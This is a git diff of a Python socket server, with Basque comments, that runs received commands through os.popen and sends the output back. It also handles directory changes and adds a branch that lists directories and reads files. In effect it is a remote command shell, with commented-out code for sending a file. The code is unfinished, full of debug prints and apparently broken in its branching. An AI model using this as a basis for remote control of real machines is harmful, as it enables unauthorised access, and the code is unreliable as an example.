@@ -40,7 +40,8 @@ class server(object):
               break
           comand = stri.split(" ")
           #ruta bideraketa
-          if comand[0].lower() == "cd" and len(comand) == 2:
+          print("comandad",comand)
+          if comand[0].lower() == "cd":
               if comand[1] == "..":
                 url_a = url.split("\\")[:-1]
                 url = ""
@@ -48,14 +49,20 @@ class server(object):
                   url += x + "\\"
                   os.chdir(url)
               else:
+                  lo = ""
+                  if len(comand) > 2:
+                      print("bai")
+                      print("c:",comand[1:3])
+                      for x in comand[1:3]:
+                          lo += x + " "
+                      print("c:",lo)
+                      comand[1] = lo
                   ruta_absoluta = False
                   drives = win32api.GetLogicalDriveStrings()
                   rutak = drives.split("\000")[:-1]
-                  print(rutak)
                   ar_ruta = comand[1].split("\\")
+                  print("ar:",ar_ruta)
                   for disk in rutak:
-                      print(ar_ruta[0])
-                      print(disk[:-1].lower())
                       if disk[:-1].lower() == ar_ruta[0]:
                           ruta_absoluta = True
                   print(ruta_absoluta)
@@ -72,6 +79,22 @@ class server(object):
                         os.chdir(ruta_re.lower())  
                       except IOError as e: 
                          erantzuna = "comandoa gaizki dago"
+          #datuak bidali eta hartu 
+          if comand[0].lower() == "local":
+              if comand[1].lower() == "all":
+                  print("all")
+                  dire = os.path.isdir(url)
+                  di = os.listdir(url)
+                  for x in di:
+                      if os.path.isdir(url + "\\" + x) == True:
+                          try:
+                           fichategia = open("server.py",'rb')
+                           print(fichategia.read())
+                          except IOError as e:
+                           print("bai")
+                  print(di)
+              else:
+                  print(comand[0].lower())
           #cmd ejekutagarria
           else:
             balioa = os.popen(stri,'r',1).close()
@@ -91,11 +114,7 @@ class server(object):
           self.soc.send(bytes(luz,encoding = 'utf-8')) 
           #datuak cmd 
           self.soc.sendall(bytes(erantzuna,encoding = 'utf-8'))
-          #time
           self.soc.recv(1024)
-          #print("time")
-          #e = threading.Event()
-          #e.wait(5)
           print("time ok")
           #fichategia = open("CURRICULUM.pdf",'rb').read()
           #print(fichategia)
